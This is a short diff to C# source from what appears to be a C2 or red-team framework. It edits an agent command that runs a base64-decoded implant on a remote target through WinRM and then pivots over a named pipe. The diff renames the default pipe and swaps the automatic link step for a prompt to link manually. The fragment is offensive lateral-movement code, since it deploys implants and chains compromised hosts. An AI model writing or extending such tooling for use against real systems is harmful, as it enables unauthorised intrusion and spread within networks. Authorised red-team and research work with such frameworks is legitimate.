@@ -18,7 +18,7 @@ namespace Common.AgentCommands.Custom
         [Option("v", "verbose", "Show details of the command execution.")]
         public bool verbose { get; set; }
 
-        [Option("n", "pipe", "Name of the pipe used to pivot.", DefaultValue = "jmp")]
+        [Option("n", "pipe", "Name of the pipe used to pivot.", DefaultValue = "jmpwinrm")]
         public string pipe { get; set; }
 
         [Option("f", "file", "FileName of payload.")]
@@ -78,8 +78,17 @@ namespace Common.AgentCommands.Custom
             context.WinRM(options.Target, Encoding.UTF8.GetString(Convert.FromBase64String(implant.Data)));
 
             var targetEndPoint = ConnexionUrl.FromString($"pipe://{options.Target}:{options.pipe}");
-            context.Echo($"[>] Linking to {targetEndPoint}");
-            context.Link(targetEndPoint);
+
+            //if (options.inject)
+            //{
+            //    context.Echo($"[>] Linking to {targetEndPoint}");
+            //    context.Link(targetEndPoint);
+            //}
+            //else
+            //{
+            context.WriteLine("Implant is not injected, WinRM Command will hang.");
+            context.WriteInfo($"You should manually link using the command : link start -b {targetEndPoint}");
+            //}
 
             context.Echo($"[*] Execution done!");
             context.Echo(Environment.NewLine);
